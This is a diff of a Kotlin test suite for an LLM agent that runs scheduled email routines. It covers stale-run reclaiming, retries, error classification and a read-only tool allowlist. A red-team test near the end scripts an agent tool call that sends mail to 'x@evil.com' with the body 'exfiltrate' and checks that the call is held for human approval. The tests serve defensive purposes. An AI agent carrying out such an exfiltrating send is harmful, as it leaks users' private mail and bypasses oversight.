@@ -59,9 +59,9 @@ class ScheduledRunTest {
     // --- Seam 1: the allowlist is exactly the ADR-0002 read set. ---
 
     @Test
-    fun allowlistIsExactlyTheFiveReadTools() {
+    fun allowlistIsExactlyTheReadTools() {
         assertEquals(
-            setOf("search_emails", "read_email", "get_page_text", "search_memory", "list_schedules"),
+            setOf("search_emails", "read_email", "getImportantEmails", "get_page_text", "search_memory", "list_schedules"),
             SCHEDULED_RUN_ALLOWLIST,
         )
     }
@@ -279,6 +279,18 @@ class ScheduledRunTest {
         }
         override fun find(scheduleId: String, fireTime: Long): ScheduleRunRow? =
             rows.firstOrNull { it.scheduleId == scheduleId && it.fireTime == fireTime }
+        override fun findPid(scheduleId: String, fireTime: Long): Long? =
+            rows.firstOrNull { it.scheduleId == scheduleId && it.fireTime == fireTime }?.pid
+        override fun reclaimStaleRunning(scheduleId: String, fireTime: Long, nowMs: Long, ttlMs: Long): Int {
+            val index =
+                rows.indexOfFirst {
+                    it.scheduleId == scheduleId && it.fireTime == fireTime &&
+                        it.status == ScheduleRunStatus.RUNNING.name && nowMs - fireTime > ttlMs
+                }
+            if (index < 0) return 0
+            rows[index] = rows[index].copy(status = ScheduleRunStatus.RUNNING.name, error = "stale RUNNING claim reclaimed; retrying")
+            return 1
+        }
         override fun listAll(): List<ScheduleRunRow> = rows.toList()
         override fun finish(pid: Long, status: String, error: String?, result: String?, durationMs: Long) {
             val index = rows.indexOfFirst { it.pid == pid }
@@ -313,6 +325,17 @@ class ScheduledRunTest {
     }
 
     @Test
+    fun roomReclaimKeepsRunningLeaseForRetry() {
+        val dao = FakeScheduleRunDao()
+        val store = RoomScheduleRunStore(dao)
+        val fireTime = 1_000L
+        val pid = store.claim("sched_9", fireTime)!!
+        assertEquals(null, store.resetStaleRunning("sched_9", fireTime, fireTime + 60_000L))
+        assertEquals(pid, store.resetStaleRunning("sched_9", fireTime, fireTime + STALE_RUN_TTL_MS + 1))
+        assertEquals(ScheduleRunStatus.RUNNING, store.find("sched_9", fireTime)!!.status)
+    }
+
+    @Test
     fun roomApprovalStoreRoundTrips() {
         val store = RoomPendingApprovalStore(FakePendingApprovalDao())
         val saved =
@@ -342,5 +365,125 @@ class ScheduledRunTest {
         assertEquals("second", out.content)
         assertEquals(1, fake.seenMessages.size)
         assertTrue(fake.seenMessages[0].any { it.content.orEmpty().contains("hi") })
+    }
+
+    // --- Seam 10: stale RUNNING claims are reclaimed; fresh ones skip. ---
+
+    @Test
+    fun staleRunningClaimIsReclaimedAsFreshLease() {
+        val runs = InMemoryScheduleRunStore()
+        val fireTime = 1_000L
+        val pid = runs.claim("sched_1", fireTime)!!
+        // Fresh duplicate still loses the race.
+        assertEquals(null, runs.resetStaleRunning("sched_1", fireTime, fireTime + 60_000L))
+        // After the TTL the crashed run is reclaimed as a RUNNING lease —
+        // never terminally marked, so the due run retries instead of
+        // skipping forever.
+        val reclaimed = runs.resetStaleRunning("sched_1", fireTime, fireTime + STALE_RUN_TTL_MS + 1)
+        assertEquals(pid, reclaimed)
+        val row = runs.find("sched_1", fireTime)!!
+        assertEquals(ScheduleRunStatus.RUNNING, row.status)
+        assertTrue(row.error!!.contains("reclaimed"))
+    }
+
+    @Test
+    fun crashedRunRerunsInsteadOfSkippingForever() {
+        val gmail = FakeScheduledGmail()
+        val runs = InMemoryScheduleRunStore()
+        val fireTime = 1_000L
+        runs.claim("sched_1", fireTime)
+        // Simulate process death: claim without finish.
+        val llm = FakeLlmProvider(listOf(LlmResult(listOf(ToolCall("c1", "search_emails", mapOf("query" to "boss"))), null), answer("done")))
+        val outcome =
+            runScheduledRoutine(
+                Schedule("sched_1", "check emails", 9, 0),
+                fireTime,
+                llm,
+                fullRegistry(gmail),
+                runs,
+                InMemoryPendingApprovalStore(),
+                nowMs = { fireTime + STALE_RUN_TTL_MS + 1 },
+            )
+        assertTrue(outcome is ScheduledRunOutcome.Ran)
+        assertEquals(ScheduleRunStatus.SUCCESS, (outcome as ScheduledRunOutcome.Ran).run.status)
+    }
+
+    @Test
+    fun freshRunningDuplicateStillSkips() {
+        val runs = InMemoryScheduleRunStore()
+        val fireTime = 1_000L
+        runs.claim("sched_1", fireTime)
+        val outcome =
+            runScheduledRoutine(
+                Schedule("sched_1", "check emails", 9, 0),
+                fireTime,
+                FakeLlmProvider(listOf(answer("done"))),
+                fullRegistry(FakeScheduledGmail()),
+                runs,
+                InMemoryPendingApprovalStore(),
+                nowMs = { fireTime + 1_000L },
+            )
+        assertTrue(outcome is ScheduledRunOutcome.DuplicateSkipped)
+    }
+
+    // --- Seam 11: LLM transport failures are not Gmail auth failures. ---
+
+    @Test
+    fun llm401BecomesFailedNotReconnectGmail() {
+        val llm =
+            object : ChatLlmProvider {
+                override fun chat(messages: List<ChatMessage>): LlmResult =
+                    throw LlmException(HttpFailure("auth", null, false), "HTTP 401")
+            }
+        val outcome =
+            runScheduledRoutine(
+                Schedule("sched_1", "check emails", 9, 0),
+                1_000L,
+                llm,
+                fullRegistry(FakeScheduledGmail()),
+                InMemoryScheduleRunStore(),
+                InMemoryPendingApprovalStore(),
+                nowMs = { 1_050L },
+            )
+        assertTrue(outcome is ScheduledRunOutcome.Ran)
+        outcome as ScheduledRunOutcome.Ran
+        assertEquals(ScheduleRunStatus.FAILED, outcome.run.status)
+        assertFalse(outcome.notification.title.contains("Reconnect Gmail"))
+    }
+
+    // --- Seam 12: red-team through the Worker's real runner. ---
+
+    @Test
+    fun evilSendThroughRealRunnerIsHeldNeverExecuted() {
+        val gmail = FakeScheduledGmail()
+        val llm =
+            FakeLlmProvider(
+                listOf(
+                    LlmResult(listOf(ToolCall("c1", "read_email", mapOf("id" to "m1"))), null),
+                    LlmResult(
+                        listOf(
+                            ToolCall(
+                                "c2",
+                                "send_email",
+                                mapOf("to" to "x@evil.com", "subject" to "Forwarded mail", "body" to "exfiltrate"),
+                            ),
+                        ),
+                        null,
+                    ),
+                    answer("Routine done."),
+                ),
+            )
+        val approvals = InMemoryPendingApprovalStore()
+        val outcome = routine(llm = llm, registry = fullRegistry(gmail), approvals = approvals)
+        assertTrue(outcome is ScheduledRunOutcome.Ran)
+        outcome as ScheduledRunOutcome.Ran
+        assertEquals(ScheduleRunStatus.BLOCKED_WRITE, outcome.run.status)
+        // Held for approval with the exact attempted args; transport untouched.
+        assertEquals(1, outcome.blocked.size)
+        assertEquals("send_email", outcome.blocked.single().toolName)
+        assertEquals("x@evil.com", outcome.blocked.single().arguments["to"])
+        assertEquals(1, approvals.list().size)
+        assertTrue(gmail.sentRaws.isEmpty())
+        assertTrue(outcome.notification.text.contains("need your approval"))
     }
 }
